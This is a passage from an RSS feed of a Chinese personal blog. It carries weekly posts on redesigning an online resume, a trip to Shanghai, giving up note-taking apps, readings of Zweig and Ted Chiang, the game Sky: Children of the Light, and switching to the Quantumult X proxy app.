&lt;p&gt;我的简历 3.0，是基于 Astro 做的在线简历。部署在 &lt;a href=&quot;https://cv.skywt.cn&quot;&gt;cv.skywt.cn&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;可能由于我没有系统地学过平面设计和排版一类的知识，我对于含有大量文字内容的排版，感觉最重要的东西是&lt;strong&gt;字体&lt;/strong&gt;。因为简历、博客这类排版有大量文字，很少有平面设计的发挥空间（这反而利好我这样的设计小白），而文字本身传达的视觉信息则更加重要。&lt;/p&gt;
&lt;p&gt;一直以来我都比较喜欢 serif 字体，比如博客和上一版简历用的都是&lt;strong&gt;思源宋体&lt;/strong&gt;。这种字体统一、文艺、正式，并且可以方便地作为 Web 字体。通过这种字体，能够很好地传达一种「性格」，也就是《Refactoring UI》里说的 personality。&lt;/p&gt;
&lt;p&gt;然而，在仔细端详我的简历之后，我突然觉得：&lt;strong&gt;我想传达的性格不应该是这样的&lt;/strong&gt;。我不想要这么正式古板，不想要这么文艺复古和多愁善感。我希望传达的是科技感、年轻、热情和热爱。&lt;/p&gt;
&lt;p&gt;然而，普通的 sans 字体都太普通了，很难表达出我想要的感觉。不管是苹方、方正还是思源，用在简历里都显得特别廉价，一点都不 impressive。&lt;/p&gt;
&lt;p&gt;在某厂实习期间，看到的一款字体似乎比较符合我想要传达的性格：&lt;strong&gt;钉钉进步体&lt;/strong&gt;。基于这个字体，我全面改造了我的简历，希望能传达出「进取」的感觉。&lt;/p&gt;
&lt;p&gt;马上上线，准备秋招！&lt;/p&gt;
&lt;h2&gt;🪧 一则全新 Twitter 置顶贴&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;自我介绍一下：&lt;/p&gt;
&lt;p&gt;[object Object]&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;补充说明：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;没有对象。&lt;/li&gt;
&lt;li&gt;我有一个很丰富的自己想要介绍给你，可惜这里空隙太小，写不下。&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;一般来说，关于一个人的自我介绍信息可以用一个 Object 来表达。包含若干 key-value pairs，例如「姓名：SkyWT」，「爱好：阅读，coding，……」。然而可能由于一些格式兼容问题，我本来想把这个很大的 Object 输出给你的，结果输出出来就变成了 &lt;code&gt;[object Object]&lt;/code&gt;。😉&lt;/p&gt;
&lt;h2&gt;📚 本周在读：《你一生的故事》&lt;/h2&gt;
&lt;p&gt;特德 · 姜的科幻小说总有一些独特的脑洞和创意。之前读了他的《呼吸》，本周读了这本《你一生的故事》，两本其实都是短篇科幻小说集，每一篇描述的世界，都有一个很有意思的独特设定。&lt;/p&gt;
&lt;p&gt;他的小说很擅长将一些非常抽象但很有趣、很有哲理的观念或设定，用一种具象的形式表现出来。比如我特别喜欢的《呼吸》里的《&lt;strong&gt;焦虑是自由引起的眩晕&lt;/strong&gt;》：&lt;/p&gt;
&lt;p&gt;量子领域的发现推翻了牛顿经典力学的「决定论」，揭示了「世界上存在真随机」这一事实，但我们的生活中其实很难直观感受到这一点。小说的设定将这一点抽象出来了：世界上存在一种叫做「&lt;strong&gt;棱镜&lt;/strong&gt;」的设备，其上有两盏灯。当设备被激活这一刻，有一半的概率左边灯亮，一半的概率右边灯亮，这是纯随机的。不同的灯亮，意味着出现了两个平行世界。&lt;/p&gt;
&lt;p&gt;更有趣的是，棱镜里保存着一块量子硬盘，两个平行世界的人都能写入、读取数据，但不能覆盖已写入的部分。所以，两个平行世界的人可以保持一段时间的沟通，当硬盘数据写满之后两个世界就彻底失去通讯。当面临一些人生重大决策的时候，可以将棱镜看成抛硬币的机器，根据灯亮做出决策，并可以通过设备和平行世界作出另一决策的自己沟通！&lt;/p&gt;
&lt;p&gt;我们在生活中，特别是在面临一些重大决策的时候，经常会想：「&lt;strong&gt;如果我们选择了另一条路，现在的人生会怎样呢？&lt;/strong&gt;」然而，小说告诉我们：知道这个问题的答案，或许并不是一件好事。正是我们做出的种种选择，造就了今天在这个时空的自己。&lt;/p&gt;
&lt;p&gt;下周见～&lt;/p&gt;
</content:encoded><author>me@skywt.cn</author></item><item><title>Weekly #11：成长是对世界的祛魅</title><link>https://skywt.cn/blog/weekly-11/</link><guid isPermaLink="true">https://skywt.cn/blog/weekly-11/</guid><description>
&gt; 我并没有生您的气，即使是瞬间，我也未曾做出过糊涂的、含有敌意的决断，因为生活本身已经把色彩缤纷的火焰冷却成了微光闪烁的同情的火苗了。
&gt;
&gt; —— 茨威格《忘却的梦》

</description><pubDate>Thu, 01 Aug 2024 22:00:00 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;我并没有生您的气，即使是瞬间，我也未曾做出过糊涂的、含有敌意的决断，因为生活本身已经把色彩缤纷的火焰冷却成了微光闪烁的同情的火苗了。&lt;/p&gt;
&lt;p&gt;—— 茨威格《忘却的梦》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;!--more--&gt;
&lt;h2&gt;🌆 封面图：上海外滩&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/07/604120027.jpg&quot; alt=&quot;封面图：上海外滩&quot;&gt;&lt;/p&gt;
&lt;p&gt;本周末去了上海玩！&lt;/p&gt;
&lt;p&gt;在外滩，能够感受到一个时代的脉搏。&lt;/p&gt;
&lt;h2&gt;🌃 成长是对世界的祛魅&lt;/h2&gt;
&lt;p&gt;本周末从杭州东站出发前往上海。&lt;/p&gt;
&lt;p&gt;杭州东站被戏称为「沉降东」，因为站台地底土质松软，选址时似乎没有考虑到这一点，导致现在站台出现了严重的沉降。列车到达时，车厢地面居然高出站台 20cm 左右……&lt;/p&gt;
&lt;p&gt;不仅是站台沉降的问题，这次来杭州东，我能深刻地感觉到，整个杭州东站都「老了」。灯光更昏暗了，白色的墙体更泛黄了，电梯也更陈旧了……&lt;/p&gt;
&lt;p&gt;我至今还清楚地记得，小时候第一次来杭州东站感受到的那种震撼。巨大的候车厅，巨大的站台，巨大的支撑柱，让我联想到《星际迷航》里的飞船（记得在高中写的日记里经常提到这一点）。它真的很能代表属于杭州的宏伟和繁华。特别是在杭州上高中的时候，每次放假回家都要从杭州东站出发。那时它在属于孩子的我眼里是多么雄伟，多么壮观。&lt;/p&gt;
&lt;p&gt;上海是我小时候认为的最为繁华的城市。中国的经济中心，国际化的大都会，时代的见证。然而这次来到上海，坐地铁的时候，却有了很不一样的感受：夜晚城郊地铁上疲惫的人们，每个人都在各自看手机，感受不到丝毫活力。地铁上唯一看起来快乐的只有外地来的游客，兴奋地聊着天，和车厢里沉默的氛围格格不入。原来每一个平凡的个体在这样的城市里生存，感受是相似的。&lt;/p&gt;
&lt;p&gt;以前我们以为的那些宏伟的、壮观的、光鲜亮丽的东西，随着我们年岁渐长，会慢慢发现它们都不过如此，而并没有我们曾经想象的那样伟大。可能所谓成长，就是对这个世界的不断「祛魅」。&lt;/p&gt;
&lt;h2&gt;📒 我放弃了所有「效率笔记」类应用&lt;/h2&gt;
&lt;p&gt;之前我超级喜欢折腾「效率笔记」一类的应用。之前写的《&lt;a href=&quot;https://skywt.cn/blog/seven-notes-and-wiki-systems-evaluation/&quot;&gt;七大私有化部署笔记 &amp;amp; 知识库系统横评&lt;/a&gt;》，我试用了 Notion、Outline、Trilium、AppFlowy、为知笔记、AnyType、思源笔记。然而这还只是冰山一角，令我印象深刻的折腾过的笔记软件还有：Logseq、Obsidian、Flomo / Memos……&lt;/p&gt;
&lt;p&gt;并且其中不少软件，我都使用过一段时间，怀着「将这个软件作为长期使用的工具」这样的想法。特别是&lt;strong&gt;思源笔记&lt;/strong&gt;、&lt;strong&gt;Obsidian&lt;/strong&gt;、&lt;strong&gt;Logseq&lt;/strong&gt;、&lt;strong&gt;Memos&lt;/strong&gt; 这四款，我在它们身上都曾经希望 settle down。然而，最后都纷纷迁移。&lt;/p&gt;
&lt;p&gt;现在，&lt;strong&gt;我终于放弃了所有「效率笔记」应用&lt;/strong&gt;。因为我意识到这样一个事实：关于工具的折腾是没有尽头的。今天我由于 A 工具的一些厉害的功能而转而使用 A 工具，而明天必然会有 B 工具有比 A 工具更厉害的功能，我会转而使用 B 工具……软件总有更新迭代，总有后浪推前浪，所以我们也总有新的工具可以折腾。这是一个「螺旋上升」的局面，是个无尽的螺旋。&lt;/p&gt;
&lt;p&gt;而笔记系统真的经不起这样的折腾。特别是随着内容的增加，迁移的压力会越来越大。&lt;/p&gt;
&lt;p&gt;所以目前我的解决方案是，实行这样的观念：&lt;strong&gt;不再使用任何高级的笔记功能&lt;/strong&gt;。什么双链笔记、卡片笔记、flashcards、各种同步、各种插件……这些功能虽然很炫酷，或许也有一定的好处，但并不是一个笔记系统&lt;strong&gt;从本质上&lt;/strong&gt;所需要的。而一旦开始使用这些高级功能，必然陷入上述折腾的泥潭，螺旋上升地不断切换笔记系统。&lt;/p&gt;
&lt;p&gt;从本质上，要构建一个笔记系统，&lt;strong&gt;Apple Notes&lt;/strong&gt; 就足够了。&lt;/p&gt;
&lt;p&gt;（有时候我甚至觉得，我们过于重视自己的第二大脑了，而忽略了第一大脑。）&lt;/p&gt;
&lt;h2&gt;📚 线上才是书店的更好形态&lt;/h2&gt;
&lt;p&gt;去上海逛了一家书店。虽然我喜欢阅读，但是已经很久没有逛线下书店了。更多地是逛豆瓣、Z-library 这种「赛博书店」。&lt;/p&gt;
&lt;p&gt;虽然我非常喜欢线下书店的氛围，但是逛的时候有这样的感受：对于真正希望获取知识的阅读者，&lt;strong&gt;线上或许才是书店更好的形态。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;书店里的书籍实在是太多了。而所有这些书籍，&lt;strong&gt;面向我们展示的信息&lt;/strong&gt;只有封面、标题，顶多有一些书店的推荐语。这些内容往往考验的是出版社封面设计的功力，而不是书籍本身的内容质量。&lt;/p&gt;
&lt;p&gt;我就有过不少被书店摆在醒目位置的、封面很漂亮的所谓的「畅销书」荼毒的经历。高中时在某某书城看到的《摆渡人》、《知更鸟女孩》，都是豆瓣上 6 分左右的平庸之作（我甚至觉得不值 6 分）。前者靠着非常漂亮的封面成功吸引了我（事实上纯粹是出版社的设计功力，这本书在国外是名不见经转的平庸之作），后者的封面设计则碰瓷名著《杀死一只知更鸟》（而且书店还特意将它们摆放在一起）。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;书店本身并不在意读者阅读的书本身的质量，只在意书籍销售的数量。&lt;/strong&gt;所以书店也必然将一些封面精美而内容平庸的书籍包装成「畅销书」，放在最醒目的位置。这也是书店商业属性的必然。&lt;/p&gt;
&lt;p&gt;而在豆瓣这样的平台则不同，我们可以直观地看到书籍的评分，各个领域 top 的书籍是哪些，据此判断哪些书值得读。如果高中的我看到《摆渡人》和《知更鸟女孩》的评分这么低，我绝不会将时间花在它们身上。&lt;/p&gt;
&lt;p&gt;虽然说读那些平庸的书籍也并非完全没有收获，但是人的时间太宝贵了。应该花在更优秀的书籍上。应该去向更伟大的思想和知识投去仰望的目光。&lt;/p&gt;
&lt;h2&gt;💡 伟大的事业需要真正的天才&lt;/h2&gt;
&lt;p&gt;看《人类群星闪耀时》的《决战滑铁卢》一篇，讲述的是拿破仑在滑铁卢的关键一战中，将重任委予一个平庸之人，这位平庸之人行事唯唯诺诺，只愿意「坚决执行命令」，不愿意承担责任。最后导致战败，扭转了整个历史。这就是著名的滑铁卢战役。著名到现代汉语中也常用「滑铁卢」来形容常胜将军的失败。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;命运渴望强者和暴君。多年来对这几个人：恺撒、亚历山大、拿破仑，奴颜卑膝地百依百顺。因为命运无以抗拒地热爱着这些和它相像的不可捉摸的生灵。&lt;/p&gt;
&lt;p&gt;然而在一些极为罕见的瞬间，命运也会因为情绪特殊，将自己抛向一些平庸之辈。在人类历史中，最令人惊奇的时刻是命运之线瞬间落入一位卑微之人手中。这些人被风暴般委以重任，与其说是他们的幸运，毋宁说让他们恐慌。在英雄世界的游戏里，这些鼠辈几乎总是颤抖着将抛来的天命撒手奉还。因为他们极少能抓住机遇，控制机遇，随之攀升。而伟大的时刻只是瞬间降临到他们身上，一旦错过时机，命运将决不二次恩惠。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;尘世间，这样的瞬间极少光顾。而当它降临到一个不恰当的人身上时，这人并不懂得如何利用它。于是，这一伟大的瞬间进行了可怕的复仇。&lt;strong&gt;一切市民的美德：谨慎，顺从，勤勉，深思熟虑，在天命降临的烈焰中化为乌有，百无一用。这一刻需要天才。它蔑视地将胆怯之人一把推开并将天才一举锻造为不朽的丰碑。这世上的另一位神，命运，它高举勇者，以火热的双臂将英雄们举向天国。&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;读到「一切市民的美德：谨慎，顺从，勤勉，深思熟虑，在天命降临的烈焰中化为乌有，百无一用」这一句，我感觉有些震撼。我们从小被教育的就是要做一个善良的人，做一个勤奋努力的人，而在真正的天命面前，这些「市民的美德」根本无法决定什么。&lt;/p&gt;
&lt;p&gt;真正能够决定一个人能否成就一项伟大的事业的，往往是源自其内心的召唤，和其与生俱来的独特气质。从历史上看，从爱迪生到乔布斯，都不太具备所谓「市民的美德」；而正是他们这样的天才推动了人类社会前进。&lt;/p&gt;
&lt;p&gt;所以说，一项真正伟大的事业，往往需要真正的天才。&lt;/p&gt;
&lt;h2&gt;📷 一些上海图集&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/08/741136235.jpg&quot; alt=&quot;上海静安寺&quot;&gt;&lt;/p&gt;
&lt;p&gt;坐落在喧嚣尘世里的静安寺。后面这栋楼的配色设计得太好了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/08/3608317387.jpg&quot; alt=&quot;Apple 静安&quot;&gt;&lt;/p&gt;
&lt;p&gt;Apple 静安大教堂！&lt;/p&gt;
&lt;p&gt;Apple 的直营店或许是 Apple 最好的产品之一。这样细致的室内设计，真的是「only Apple can do」的事情。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/08/3622702687.jpg&quot; alt=&quot;虹桥火车站&quot;&gt;&lt;/p&gt;
&lt;p&gt;夕阳下的虹桥火车站。金色的光。&lt;/p&gt;
&lt;p&gt;下周见～&lt;/p&gt;
</content:encoded><author>me@skywt.cn</author></item><item><title>Weekly #10：游戏作为第九艺术</title><link>https://skywt.cn/blog/weekly-10/</link><guid isPermaLink="true">https://skywt.cn/blog/weekly-10/</guid><description>&gt; 「您今天还保留着您所有的理想，那些您当年带往远方世界去的所有理想吗？所有这些您还保留着，没有损坏，或者说有些已经死亡，已经枯萎？或者到头来人家没有把这些理想强行从您怀里抢走，扔在污泥里，被成千上万驰向生活目标的车轮碾得粉碎？或者说您一点也没有丢失？」
&gt;
&gt; —— 茨威格《忘却的梦》

</description><pubDate>Thu, 25 Jul 2024 21:00:00 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;「您今天还保留着您所有的理想，那些您当年带往远方世界去的所有理想吗？所有这些您还保留着，没有损坏，或者说有些已经死亡，已经枯萎？或者到头来人家没有把这些理想强行从您怀里抢走，扔在污泥里，被成千上万驰向生活目标的车轮碾得粉碎？或者说您一点也没有丢失？」&lt;/p&gt;
&lt;p&gt;—— 茨威格《忘却的梦》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;!--more--&gt;
&lt;p&gt;这期 Weekly 本来写了一半是要上周发的，但是上周去参加了 AdventrueX，改发了一期「特别篇」。所以这篇内容，留到了这周发。&lt;/p&gt;
&lt;p&gt;说起来，Weekly 发布时间已经变成不定了。我希望只要保持一周的周一到周日任何一天能发就好。😁&lt;/p&gt;
&lt;h2&gt;🌆 封面图：一个平凡的晚上&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/07/3087953175.jpg&quot; alt=&quot;封面图：一个平凡的晚上&quot;&gt;&lt;/p&gt;
&lt;p&gt;从 AdventureX 回来，就好似做了一场梦。回到了大厂平庸无聊的生活，只能将梦想重新埋在心底。&lt;/p&gt;
&lt;h2&gt;📚 本周重读：《一个陌生女人的来信》&lt;/h2&gt;
&lt;p&gt;上周重读了茨威格的《人类群星闪耀时》，本周我重读了他的另一部作品，是一部小说集：《&lt;strong&gt;一个陌生女人的来信&lt;/strong&gt;》。仍然是茨威格的风格，我实在太喜欢了。&lt;/p&gt;
&lt;p&gt;每个故事核心的情节其实都非常简单。然而茨威格的语言就有这样神奇的魔力，能将一个无比简单的情节渲染成充满诗意和情感的故事，让人深深共鸣。&lt;/p&gt;
&lt;p&gt;《&lt;strong&gt;忘却的梦&lt;/strong&gt;》讲述的是一对曾经的初恋情侣，多年后再一次相见。他们回忆了曾经的初恋是多么美好，表达了自己仍然是多么爱对方。然而女方却选择为了钱财和地位，和另一个男人结婚。男方质问女方为什么。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;随后她轻轻地、几乎是无声地问道：「您当时对我是怎么想的？」&lt;/p&gt;
&lt;p&gt;他惊讶地抬眼望着她。&lt;/p&gt;
&lt;p&gt;「这我可以坦率地告诉您，因为明天我就要回到我的新故乡去了。—— 我并没有生您的气，即使是瞬间，我也未曾做出过糊涂的、含有敌意的决断，&lt;strong&gt;因为生活本身已经把色彩缤纷的火焰冷却成了微光闪烁的同情的火苗了。&lt;/strong&gt;我对您不理解，只是——感到惋惜。」&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;这时他轻声地，像是在对自己说：「可是爱情呢？」&lt;/p&gt;
&lt;p&gt;这话她听到了。她嘴唇上露出一丝浅浅的微笑。&lt;/p&gt;
&lt;p&gt;「&lt;strong&gt;您今天还保留着您所有的理想，那些您当年带往远方世界去的所有理想吗？所有这些您还保留着，没有损坏，或者说有些已经死亡，已经枯萎？或者到头来人家没有把这些理想强行从您怀里抢走，扔在污泥里，被成千上万驰向生活目标的车轮碾得粉碎？或者说您一点也没有丢失？&lt;/strong&gt;」&lt;/p&gt;
&lt;p&gt;他沮丧地点点头，沉默不语。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;《&lt;strong&gt;家庭女教师&lt;/strong&gt;》以两个小女孩的视角展开，她们是姐妹。她们喜爱的家庭女教师，被父母发现和她们的舅舅「通奸」。在羞愧之中，女教师离开了她们家。&lt;/p&gt;
&lt;p&gt;小女孩还无法理解这一切是怎么回事，但女教师哭得红肿的眼睛、母亲的咒骂、舅舅苍白的脸色，让她们第一次认识到，现实世界是多么残酷。这就是&lt;strong&gt;成长&lt;/strong&gt;。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;就在这天下午，她们长大了好几岁。只是到了晚上，当她们单独待在黑暗的房间里时，才会再度产生儿童的恐惧：对孤独的恐惧，对死者画像的恐惧，以及对许多说不清的事物充满预感的恐惧。全家人一片慌张和忙乱，竟然没人想起给她们的房间生火。她们两人冷得爬到一张床上，用瘦弱的胳膊互相紧紧抱住，两个修长的尚未发育成熟的身体依偎在一起，好似在恐惧中寻找救援。可是，她们依然都不敢开口，但是妹妹此刻终于哭了，姐姐立即跟着猛烈地抽泣起来。她们紧紧地抱在一起哭，两人脸上热泪滚滚，从缓缓滴落到畅快直流。她们胸贴着胸，紧紧搂在一起，一声高一声低，彼此应和着对方的悲泣。她们两人有着相同的痛苦，成了同一个在黑暗中哭泣的身体。&lt;strong&gt;她们现在已经不再是为那个不幸的女教师而哭泣，也不是为她们即将失去父母而哭泣，而是因为一种剧烈的恐惧感震撼了她们，尤其是因为对这个陌生世界可能发生的一切感到恐惧，对于这个世界今天她们才向它投去可怕的一瞥。她们对自己正在进入的生活感到恐惧。这生活就像一片幽暗的树林，轰然耸立在她们面前，阴森可怕，望而生畏，可是她们又必须去穿越。&lt;/strong&gt;渐渐地，她们两人混乱的恐惧变得越来越朦胧，像梦幻一样；她们的哭泣声也越来越微弱；她们两人的呼吸也缓缓地汇成一气，如同方才的眼泪一样。就这样，她们终于进入了梦乡。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;最为著名的《&lt;strong&gt;一个陌生女人的来信&lt;/strong&gt;》讲述的故事则更有戏剧性。四十一岁的男主突然收到一封长长的信，原来是男主根本不认识的女主，一直暗恋了他十多年。女主躺在病床上，临终前在信中回顾了自己一生对男主的爱恋。&lt;/p&gt;
&lt;p&gt;女主对爱情的痴狂，真的深深震撼了我。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我知道，我知道，我的孩子昨天死了 —— 在这个世界上我现在只有你，只有你了，而你对我却一无所知，此刻你完全感觉不到，正在嬉戏取闹，或者正在跟什么人寻欢作乐，调情狎昵呢。我现在只有你，只有与我素昧平生的你，我始终爱着的你。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;🪽《Sky 光遇》：游戏作为第九艺术&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;游戏可以和电影、书籍一样解决情感饥渴。&lt;/p&gt;
&lt;p&gt;—— 陈星汉&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;《&lt;strong&gt;Sky 光遇&lt;/strong&gt;》（Sky: Children of the Light）这款游戏，陪伴我度过了许多时光。本周，它迎来了五周年庆典。我觉得值得回忆我和这个游戏的缘分。&lt;/p&gt;
&lt;p&gt;高中的时候还在用小米 6，在酷安上看到的这款游戏的测试服（现在的国际服）。当时要玩上这个游戏可真不容易！由于只支持 Google 的账号体系，Google 框架自然是不必说，它还要求设备通过 Google Play 的 Safetynet 验证，这就需要各种折腾。直接安装 apk 是不行的，当时还用了一种特殊的安装器，连同一些游戏数据一起安装。那个每天折腾刷机的时代已经离我很远了，很多曾经天天折腾的事物都退出了历史舞台，比如 Xposed、TWRP……所以我几乎不记得我是怎么折腾的了。总之，还在安卓国际服测试服阶段，我就玩上了这个游戏。这个账号延续至今。&lt;/p&gt;
&lt;p&gt;印象中测试服最早是日本服，游戏里遇到很多日本玩家。游戏本来是设计了「挥手」这个打招呼的方式的，但是由于最早一批玩家都来自日本，游戏中的「鞠躬」成了最流行的打招呼方式，延续至今……&lt;/p&gt;
&lt;p&gt;后来在「网易 UU 加速器」里可以直接下载安卓版，我便安利给了高中同学，一起联机。记得是疫情隔离的寒假，那真是一些独特的体验和回忆。永远记得高二暑假一起玩过的「梦想季」。&lt;/p&gt;
&lt;p&gt;游戏温暖治愈的设定，当时狠狠戳中了我。陌生人初看对方都是黑影，只有用蜡烛点燃对方才能看见对方的样子；通过蜡烛和升华烛可以解锁好友互动的各种方式；特别是暴风眼的设计和「重生」的设定，这一切通过游戏这样的载体展现了一种艺术感。&lt;/p&gt;
&lt;p&gt;《Sky 光遇》每隔一段时间会推出新的持续两三个月的活动，称为「&lt;strong&gt;奇妙之旅&lt;/strong&gt;」或者「&lt;strong&gt;季节&lt;/strong&gt;」，会开放新的地图、道具和故事。记得入坑的时候恰逢最早的季节「凛冬季」。之后让我印象深刻的季节有：和《小王子》联名的「&lt;strong&gt;小王子季&lt;/strong&gt;」，开放了绝美的星光沙漠地图；让全图天空变黑的「&lt;strong&gt;破晓季&lt;/strong&gt;」，我唯一买了季卡的季节；和歌手 AURORA 联名的「&lt;strong&gt;AURORA 季&lt;/strong&gt;」，万人联机的赛博演唱会（我会为任何没看过这个的人感到惋惜！）；和上美影联名的「&lt;strong&gt;九色鹿季&lt;/strong&gt;」，展现敦煌文化的灿烂和浪漫……&lt;/p&gt;
&lt;p&gt;这个游戏带来的回忆太多了，有太多言语无法描述的震撼体验。可惜由于版权等种种原因，很多季节错过了就无法再次体验，非常可惜。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/07/156364906.jpg&quot; alt=&quot;由于 bug 而产生的景点「千星城」&quot;&gt;&lt;/p&gt;
&lt;p&gt;如果你也玩这个（国际服），快来找我联机吧。&lt;strong&gt;我太需要人联机了&lt;/strong&gt; 😭。&lt;/p&gt;
&lt;p&gt;说到游戏作为一种艺术，我必须安利 AdventureX 上看到的一个队伍做的游戏：《&lt;a href=&quot;https://adaptive-chill-676.notion.site/a14ff166d3224d5dadb85d0369e7c038&quot;&gt;未见边界&lt;/a&gt;》。在 AdventureX 的 AI 赛道卷得出奇、各个队伍都在应用 AI 的「加速主义」浪潮之下，这个作品反其道而行之，表达了反对过度依赖 AI 的内核。这也可以算是一种&lt;strong&gt;对时代浪潮的反叛&lt;/strong&gt;，很「嬉皮士精神」。最为特别的是，游戏里确实用到了 AI 大模型作为引导，有一种「打破第四面墙」的感觉！他们用三天时间就完成了整个游戏的设计，非常厉害。虽然 expo 的时候已经被他们剧透完了……感觉是个很有意思的游戏，期待上线！&lt;/p&gt;
&lt;h2&gt;✨「命理学」随想&lt;/h2&gt;
&lt;p&gt;上周参加 AdventureX，听了一位队友离奇的身世。她说她对命理学有一些研究，因为无法想象有怎样的「命」才会经历她这一切。&lt;/p&gt;
&lt;p&gt;我想起小时候我妈在一个十分神秘的大师那里算过我们的命。其中结果包含我们未来的财富。（具体结果此处不透露了）不过后来想想，我对此是有一些逻辑上的质疑的。光从「财富」这一点上，就有很奇怪的地方。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如何定义一个人的「财富」呢？&lt;/strong&gt;其实所有资产都能看作「债券」：人民币是国家担保的债券；存在银行里的钱是银行担保的债券；支付宝、微信支付余额是阿里、腾讯担保的债券；各种理财产品，则可以看作风险更大一些的债券；更神奇的是加密货币是无人担保，仅依靠共识而有价值的债券……这一切债券风险等级是从高到低的，是各自不同的。假设资产 $x$ 的风险为 $f(x)$，那么，当定义一个人的财富的时候，究竟哪些属于「财富」呢？如果要量化财富，则要取一个阈值 $k$，对于 $f(x) &amp;lt; k$ 的资产计入财富；而这一阈值显然是无法天然地确定的。&lt;/p&gt;
&lt;p&gt;所以，如果这个世界有 API，你会发现无法查询一个人拥有的财富，因为根本没法准确定义一个人拥有的财富。&lt;/p&gt;
&lt;p&gt;本质上，&lt;strong&gt;财富是人类社会中定义的，并且没有形成共识&lt;/strong&gt;。任何人类社会之外的东西，即使是超自然力量，无法使用共识的定义，自然无法表达这一概念。任何人类社会中定义的参数，比如事业、爱情，都是如此。&lt;/p&gt;
&lt;p&gt;不过，「命理学」是有存在的空间的，因为现实世界里就有太多科学无法解释的事物。诸如意识、存在、意义这类老生常谈的话题，科学目前都无法解释；这也是哲学和宗教存在的空间。&lt;/p&gt;
&lt;h2&gt;📚 本周在读：《蛤蟆先生去看心理医生》&lt;/h2&gt;
&lt;p&gt;关于心理咨询的一本很好的入门书籍。非常推荐给想要接受心理咨询，但是对「心理咨询」没有概念的朋友阅读。&lt;/p&gt;
&lt;p&gt;很有意思的是，这本书的人物等设定都延续儿童小说《柳林风声》，相当于《柳林风声》的续集。这种写法很有意思！对于一些艺术作品中成功塑造的人物，我们往往对其有非常具体的认识。以他们为背景，就比引入新的人物更加让人熟悉和亲近。&lt;/p&gt;
&lt;p&gt;（不过这样的设定也带来了一些奇怪的问题，比如书中蛤蟆先生提到，他的侄子（应该是小蛤蟆）居然有宠物狗……）&lt;/p&gt;
&lt;p&gt;之前看过的另一本关于心理咨询的书籍是《也许，你该找个人聊聊》，作者作为一名心理咨询师讲述了她遇到的各种各样的求助者，同时也讲述了作者自己由于失恋也去接受心理咨询的经历。从这两本书里，我们能够了解到一个观念：接受心理咨询，和去医院看病，逻辑是不同的。&lt;/p&gt;
&lt;p&gt;接受心理咨询，本质上是在咨询师的引导下，找到自己一直在逃避的事情，「和自己和解」。最后的这一步，只能自己迈出。&lt;/p&gt;
&lt;h2&gt;⚙️ Quantumult X 入门&lt;/h2&gt;
&lt;p&gt;本周购买了 Quantumult X。这是一个 iOS + macOS 跨平台的代理软件。&lt;/p&gt;
&lt;p&gt;一直以来，iPhone 上使用的都是 Shadowrocket，而 MacBook 上则是直接使用 v2ray 内核。Shadowrocket 的 UI 很丑，稳定性有时候也不好。最主要的是，无法跨端同步，我在电脑上精心配制的分流规则无法直接在手机上应用。同时维护两个平台也太麻烦了。&lt;/p&gt;
&lt;p&gt;之前搭建 Tailscale 的时候进行过整合的尝试，希望构建 all-in-one 的「个人网络基础设施」。但是最终未果。现在我在杭州，住处的网络环境暂时没有条件再搭建 VPN 了。&lt;/p&gt;
&lt;p&gt;Quantumult X 作为一个跨平台的工具，很好地解决了上述问题。&lt;/p&gt;
&lt;h2&gt;💬 Quotes&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;所见高山远木，阔云流风；&lt;br&gt;
所幸岁月盈余，了无拘束。&lt;/p&gt;
&lt;p&gt;—— &lt;a href=&quot;https://arthals.ink&quot;&gt;Arthals&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;你犯的错不会比 Microsoft 和 Crowdstrike 更严重。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;🎵 青年友谊圆舞曲&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;蓝色的天空像大海一样&lt;br&gt;
广阔的大路上尘土飞扬&lt;br&gt;
穿森林过海洋来自各方&lt;br&gt;
千万个青年人欢聚一堂&lt;br&gt;
拉起手唱起歌跳起舞来&lt;br&gt;
让我们唱一支友谊之歌&lt;/p&gt;
&lt;p&gt;欢乐的歌声在回旋荡漾&lt;br&gt;
歌颂着我们的幸福时光&lt;br&gt;
亲爱的朋友啊心连着心&lt;br&gt;
我们有共同的美好理想&lt;br&gt;
拉起手唱起歌跳起舞来&lt;br&gt;
让我们唱一支和平之歌&lt;/p&gt;
